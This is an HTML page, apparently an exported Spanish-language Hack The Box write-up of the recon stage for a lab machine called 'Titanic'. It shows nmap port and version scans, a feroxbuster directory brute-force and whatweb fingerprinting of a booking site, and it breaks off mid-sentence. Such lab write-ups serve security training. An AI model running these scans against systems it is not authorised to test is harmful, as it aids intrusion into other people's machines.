@@ -1,0 +1,1019 @@
+<!DOCTYPE html> <html><head>
+		<title>1.Recon</title>
+		<base href="../../">
+		<meta id="root-path" root-path="../../">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
+		<meta charset="UTF-8">
+		<meta name="description" content="HTB - 1.Recon">
+		<meta property="og:title" content="1.Recon">
+		<meta property="og:description" content="HTB - 1.Recon">
+		<meta property="og:type" content="website">
+		<meta property="og:url" content="machines/titanic/1.recon.html">
+		<meta property="og:image" content="machines/titanic/imgs/pasted-image-20250217165949.png">
+		<meta property="og:site_name" content="HTB">
+		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title show-ribbon"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles">mjx-container[jax=CHTML]{line-height:0}mjx-container [space="1"]{margin-left:.111em}mjx-container [space="2"]{margin-left:.167em}mjx-container [space="3"]{margin-left:.222em}mjx-container [space="4"]{margin-left:.278em}mjx-container [space="5"]{margin-left:.333em}mjx-container [rspace="1"]{margin-right:.111em}mjx-container [rspace="2"]{margin-right:.167em}mjx-container [rspace="3"]{margin-right:.222em}mjx-container [rspace="4"]{margin-right:.278em}mjx-container [rspace="5"]{margin-right:.333em}mjx-container [size="s"]{font-size:70.7%}mjx-container [size=ss]{font-size:50%}mjx-container [size=Tn]{font-size:60%}mjx-container [size=sm]{font-size:85%}mjx-container [size=lg]{font-size:120%}mjx-container [size=Lg]{font-size:144%}mjx-container [size=LG]{font-size:173%}mjx-container [size=hg]{font-size:207%}mjx-container [size=HG]{font-size:249%}mjx-container [width=full]{width:100%}mjx-box{display:inline-block}mjx-block{display:block}mjx-itable{display:inline-table}mjx-row{display:table-row}mjx-row>*{display:table-cell}mjx-mtext{display:inline-block}mjx-mstyle{display:inline-block}mjx-merror{display:inline-block;color:red;background-color:#ff0}mjx-mphantom{visibility:hidden}mjx-assistive-mml{top:0;left:0;clip:rect(1px,1px,1px,1px);user-select:none;position:absolute!important;padding:1px 0 0!important;border:0!important;display:block!important;width:auto!important;overflow:hidden!important}mjx-assistive-mml[display=block]{width:100%!important}mjx-math{display:inline-block;text-align:left;line-height:0;text-indent:0;font-style:normal;font-weight:400;font-size:100%;letter-spacing:normal;border-collapse:collapse;overflow-wrap:normal;word-spacing:normal;white-space:nowrap;direction:ltr;padding:1px 0}mjx-container[jax=CHTML][display=true]{display:block;text-align:center;margin:1em 0}mjx-container[jax=CHTML][display=true][width=full]{display:flex}mjx-container[jax=CHTML][display=true] mjx-math{padding:0}mjx-container[jax=CHTML][justify=left]{text-align:left}mjx-container[jax=CHTML][justify=right]{text-align:right}mjx-mo{display:inline-block;text-align:left}mjx-stretchy-h{display:inline-table;width:100%}mjx-stretchy-h>*{display:table-cell;width:0}mjx-stretchy-h>*>mjx-c{display:inline-block;transform:scaleX(1)}mjx-stretchy-h>*>mjx-c::before{display:inline-block;width:initial}mjx-stretchy-h>mjx-ext{overflow:clip visible;width:100%}mjx-stretchy-h>mjx-ext>mjx-c::before{transform:scaleX(500)}mjx-stretchy-h>mjx-ext>mjx-c{width:0}mjx-stretchy-h>mjx-beg>mjx-c{margin-right:-.1em}mjx-stretchy-h>mjx-end>mjx-c{margin-left:-.1em}mjx-stretchy-v{display:inline-block}mjx-stretchy-v>*{display:block}mjx-stretchy-v>mjx-beg{height:0}mjx-stretchy-v>mjx-end>mjx-c{display:block}mjx-stretchy-v>*>mjx-c{transform:scaleY(1);transform-origin:left center;overflow:hidden}mjx-stretchy-v>mjx-ext{display:block;height:100%;box-sizing:border-box;border:0 solid transparent;overflow:visible clip}mjx-stretchy-v>mjx-ext>mjx-c::before{width:initial;box-sizing:border-box}mjx-stretchy-v>mjx-ext>mjx-c{transform:scaleY(500) translateY(.075em);overflow:visible}mjx-mark{display:inline-block;height:0}mjx-c{display:inline-block}mjx-utext{display:inline-block;padding:.75em 0 .2em}mjx-mi{display:inline-block;text-align:left}mjx-texatom{display:inline-block;text-align:left}mjx-msup{display:inline-block;text-align:left}mjx-mn{display:inline-block;text-align:left}mjx-c::before{display:block;width:0}.MJX-TEX{font-family:MJXZERO,MJXTEX}.TEX-B{font-family:MJXZERO,MJXTEX-B}.TEX-I{font-family:MJXZERO,MJXTEX-I}.TEX-MI{font-family:MJXZERO,MJXTEX-MI}.TEX-BI{font-family:MJXZERO,MJXTEX-BI}.TEX-S1{font-family:MJXZERO,MJXTEX-S1}.TEX-S2{font-family:MJXZERO,MJXTEX-S2}.TEX-S3{font-family:MJXZERO,MJXTEX-S3}.TEX-S4{font-family:MJXZERO,MJXTEX-S4}.TEX-A{font-family:MJXZERO,MJXTEX-A}.TEX-C{font-family:MJXZERO,MJXTEX-C}.TEX-CB{font-family:MJXZERO,MJXTEX-CB}.TEX-FR{font-family:MJXZERO,MJXTEX-FR}.TEX-FRB{font-family:MJXZERO,MJXTEX-FRB}.TEX-SS{font-family:MJXZERO,MJXTEX-SS}.TEX-SSB{font-family:MJXZERO,MJXTEX-SSB}.TEX-SSI{font-family:MJXZERO,MJXTEX-SSI}.TEX-SC{font-family:MJXZERO,MJXTEX-SC}.TEX-T{font-family:MJXZERO,MJXTEX-T}.TEX-V{font-family:MJXZERO,MJXTEX-V}.TEX-VB{font-family:MJXZERO,MJXTEX-VB}mjx-stretchy-h mjx-c,mjx-stretchy-v mjx-c{font-family:MJXZERO,MJXTEX-S1,MJXTEX-S4,MJXTEX,MJXTEX-A!important}@font-face{font-family:MJXZERO;src:url("lib/fonts/mathjax_zero.woff") format("woff")}@font-face{font-family:MJXTEX;src:url("lib/fonts/mathjax_main-regular.woff") format("woff")}@font-face{font-family:MJXTEX-B;src:url("lib/fonts/mathjax_main-bold.woff") format("woff")}@font-face{font-family:MJXTEX-I;src:url("lib/fonts/mathjax_math-italic.woff") format("woff")}@font-face{font-family:MJXTEX-MI;src:url("lib/fonts/mathjax_main-italic.woff") format("woff")}@font-face{font-family:MJXTEX-BI;src:url("lib/fonts/mathjax_math-bolditalic.woff") format("woff")}@font-face{font-family:MJXTEX-S1;src:url("lib/fonts/mathjax_size1-regular.woff") format("woff")}@font-face{font-family:MJXTEX-S2;src:url("lib/fonts/mathjax_size2-regular.woff") format("woff")}@font-face{font-family:MJXTEX-S3;src:url("lib/fonts/mathjax_size3-regular.woff") format("woff")}@font-face{font-family:MJXTEX-S4;src:url("lib/fonts/mathjax_size4-regular.woff") format("woff")}@font-face{font-family:MJXTEX-A;src:url("lib/fonts/mathjax_ams-regular.woff") format("woff")}@font-face{font-family:MJXTEX-C;src:url("lib/fonts/mathjax_calligraphic-regular.woff") format("woff")}@font-face{font-family:MJXTEX-CB;src:url("lib/fonts/mathjax_calligraphic-bold.woff") format("woff")}@font-face{font-family:MJXTEX-FR;src:url("lib/fonts/mathjax_fraktur-regular.woff") format("woff")}@font-face{font-family:MJXTEX-FRB;src:url("lib/fonts/mathjax_fraktur-bold.woff") format("woff")}@font-face{font-family:MJXTEX-SS;src:url("lib/fonts/mathjax_sansserif-regular.woff") format("woff")}@font-face{font-family:MJXTEX-SSB;src:url("lib/fonts/mathjax_sansserif-bold.woff") format("woff")}@font-face{font-family:MJXTEX-SSI;src:url("lib/fonts/mathjax_sansserif-italic.woff") format("woff")}@font-face{font-family:MJXTEX-SC;src:url("lib/fonts/mathjax_script-regular.woff") format("woff")}@font-face{font-family:MJXTEX-T;src:url("lib/fonts/mathjax_typewriter-regular.woff") format("woff")}@font-face{font-family:MJXTEX-V;src:url("lib/fonts/mathjax_vector-regular.woff") format("woff")}@font-face{font-family:MJXTEX-VB;src:url("lib/fonts/mathjax_vector-bold.woff") format("woff")}mjx-c.mjx-c28::before{padding:.75em .389em .25em 0;content:"("}mjx-c.mjx-c1D452.TEX-I::before{padding:.442em .466em .011em 0;content:"e"}mjx-c.mjx-c1D450.TEX-I::before{padding:.442em .433em .011em 0;content:"c"}mjx-c.mjx-c210E.TEX-I::before{padding:.694em .576em .011em 0;content:"h"}mjx-c.mjx-c1D45C.TEX-I::before{padding:.441em .485em .011em 0;content:"o"}mjx-c.mjx-c2033::before{padding:.56em .55em 0 0;content:"′′"}mjx-c.mjx-c1D451.TEX-I::before{padding:.694em .52em .01em 0;content:"d"}mjx-c.mjx-c1D44E.TEX-I::before{padding:.441em .529em .01em 0;content:"a"}mjx-c.mjx-c1D461.TEX-I::before{padding:.626em .361em .011em 0;content:"t"}mjx-c.mjx-c7C::before{padding:.75em .278em .249em 0;content:"|"}mjx-c.mjx-c1D462.TEX-I::before{padding:.442em .572em .011em 0;content:"u"}mjx-c.mjx-c2212::before{padding:.583em .778em .082em 0;content:"−"}mjx-c.mjx-c2032::before{padding:.56em .275em 0 0;content:"′"}mjx-c.mjx-c1D453.TEX-I::before{padding:.705em .55em .205em 0;content:"f"}mjx-c.mjx-c33::before{padding:.665em .5em .022em 0;content:"3"}mjx-c.mjx-c29::before{padding:.75em .389em .25em 0;content:")"}mjx-c.mjx-c3B::before{padding:.43em .278em .194em 0;content:";"}mjx-c.mjx-c1D460.TEX-I::before{padding:.442em .469em .01em 0;content:"s"}mjx-c.mjx-c1D459.TEX-I::before{padding:.694em .298em .011em 0;content:"l"}mjx-c.mjx-c3A::before{padding:.43em .278em 0 0;content:":"}</style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="1.Recon"><p dir="auto">1.Recon</p></h1><div class="el-h2 heading-wrapper"><h2 data-heading="Nmap summary" dir="auto" class="heading" id="Nmap_summary"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Nmap summary</h2><div class="heading-children"><div class="el-h3 heading-wrapper"><h3 data-heading="Syn scan" dir="auto" class="heading" id="Syn_scan"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Syn scan</h3><div class="heading-children"><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT   STATE SERVICE REASON
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     syn-ack ttl <span class="token number">63</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http    syn-ack ttl <span class="token number">63</span>
+
+Read data files from: /usr/share/nmap
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">70.18</span> seconds
+           Raw packets sent: <span class="token number">70069</span> <span class="token punctuation">(</span><span class="token number">3</span>.083MB<span class="token punctuation">)</span> <span class="token operator">|</span> Rcvd: <span class="token number">65972</span> <span class="token punctuation">(</span><span class="token number">2</span>.639MB<span class="token punctuation">)</span>
+
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="sCV scan" dir="auto" class="heading" id="sCV_scan"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>sCV scan</h3><div class="heading-children"><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">PORT   STATE SERVICE REASON         VERSION
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     syn-ack ttl <span class="token number">63</span> OpenSSH <span class="token number">8</span>.9p1 Ubuntu 3ubuntu0.10 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">73</span>:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg<span class="token operator">=</span>
+<span class="token operator">|</span>   <span class="token number">256</span> d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token operator">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http    syn-ack ttl <span class="token number">63</span> Apache httpd <span class="token number">2.4</span>.52
+<span class="token operator">|</span>_http-favicon: Unknown favicon MD5: 79E1E0A79A613646F473CFEDA9E231F1
+<span class="token operator">|</span> http-methods: 
+<span class="token operator">|</span>_  Supported Methods: GET HEAD OPTIONS
+<span class="token operator">|</span>_http-title: Titanic - Book Your Ship Trip
+<span class="token operator">|</span> http-server-header: 
+<span class="token operator">|</span>   Apache/2.4.52 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  Werkzeug/3.0.3 Python/3.10.12
+Service Info: Host: titanic.htb<span class="token punctuation">;</span> OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="Puerto 80" dir="auto" class="heading" id="Puerto_80"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Puerto 80</h3><div class="heading-children"><div class="el-h4 heading-wrapper"><h4 data-heading="Fuzzing" dir="auto" class="heading" id="Fuzzing"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Fuzzing</h4><div class="heading-children"><div class="el-pre"><pre class="language-http" tabindex="0"><code data-line="0" class="language-http is-loaded">➜  ~ feroxbuster --url http://titanic.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -t 200
+                                                                                                                     
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://titanic.htb
+ 🚀  Threads               │ 200
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+405      GET        5l       20w      153c http://titanic.htb/book
+200      GET       30l       77w      567c http://titanic.htb/static/styles.css
+200      GET     2986l     7000w   469100c http://titanic.htb/static/assets/images/favicon.ico
+200      GET      664l     5682w   412611c http://titanic.htb/static/assets/images/home.jpg
+200      GET      859l     5115w   510909c http://titanic.htb/static/assets/images/luxury-cabins.jpg
+200      GET      890l     5324w   534018c http://titanic.htb/static/assets/images/entertainment.jpg
+200      GET      851l     5313w   507854c http://titanic.htb/static/assets/images/exquisite-dining.jpg
+200      GET      156l      415w     7399c http://titanic.htb/
+
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Un whatweb nos indica que estamos trabajando contra un Servidor web Python, Wekzeug;</p></div><div class="el-pre"><pre class="language-python" tabindex="0"><code data-line="0" class="language-python is-loaded">➜  <span class="token operator">~</span> whatweb http<span class="token punctuation">:</span><span class="token operator">//</span>titanic<span class="token punctuation">.</span>htb 
+http<span class="token punctuation">:</span><span class="token operator">//</span>titanic<span class="token punctuation">.</span>htb <span class="token punctuation">[</span><span class="token number">200</span> OK<span class="token punctuation">]</span> Bootstrap<span class="token punctuation">[</span><span class="token number">4.5</span><span class="token number">.2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Country<span class="token punctuation">[</span>RESERVED<span class="token punctuation">]</span><span class="token punctuation">[</span>ZZ<span class="token punctuation">]</span><span class="token punctuation">,</span> HTML5<span class="token punctuation">,</span> HTTPServer<span class="token punctuation">[</span>Werkzeug<span class="token operator">/</span><span class="token number">3.0</span><span class="token number">.3</span> Python<span class="token operator">/</span><span class="token number">3.10</span><span class="token number">.12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> IP<span class="token punctuation">[</span><span class="token number">10.10</span><span class="token number">.11</span><span class="token number">.55</span><span class="token punctuation">]</span><span class="token punctuation">,</span> JQuery<span class="token punctuation">,</span> Python<span class="token punctuation">[</span><span class="token number">3.10</span><span class="token number">.12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Script<span class="token punctuation">,</span> Title<span class="token punctuation">[</span>Titanic <span class="token operator">-</span> Book Your Ship Trip<span class="token punctuation">]</span><span class="token punctuation">,</span> Werkzeug<span class="token punctuation">[</span><span class="token number">3.0</span><span class="token number">.3</span><span class="token punctuation">]</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Parece una pagina tipo "booking" para entradas al Titanic, esta cachonda;</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250217165949.png" src="Pasted image 20250217165949.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250217165949.png" src="machines/titanic/imgs/pasted-image-20250217165949.png"></span><br>
+Ninguno de los botones de la pagina funcionan excepto el de Book Now;<br>
+<span alt="Pasted image 20250217170046.png" src="Pasted image 20250217170046.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250217170046.png" src="machines/titanic/imgs/pasted-image-20250217170046.png"></span></p></div><div class="el-p"><p dir="auto">Si le damos a submit nos decarga el formulario en formato json;<br>
